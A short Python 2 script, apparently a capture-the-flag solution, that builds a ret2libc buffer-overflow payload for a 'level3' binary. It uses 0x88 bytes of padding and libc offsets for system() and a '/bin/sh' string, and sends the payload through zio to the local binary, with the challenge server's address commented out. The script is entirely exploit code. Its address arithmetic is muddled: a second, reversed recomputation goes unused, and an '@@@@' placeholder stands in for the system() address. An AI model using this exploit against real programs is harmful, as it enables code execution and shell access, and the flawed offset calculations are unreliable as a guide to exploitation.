#!/usr/bin/env python
# encoding:utf-8

import zio
import binascii

readAddress = 0x0804A00C

libc_read = 0x000DAF60
libc_system = 0x00040310
libc_argv = 0x0016084C 

address_system = zio.l32(readAddress - (libc_read - libc_system))
address_argv = zio.l32(readAddress - (libc_read - libc_argv))

print binascii.b2a_hex(address_system)
print binascii.b2a_hex(address_argv)

##########
address_system = zio.l32(0x00040310 - (0x0804A00C - 0x000DAF60))
##########

payload = "A" * 0x88 + "BBBB"
# payload += address_system # system() 函数的地址
payload += "@@@@" # 函数的地址
payload += "\x00" * 4
payload += address_argv # "/bin/sh" 的地址

Io = zio.zio("./level3")
# Io = zio.zio(("pwn2.jarvisoj.com", 9879))
Io.write(payload)
Io.interact()
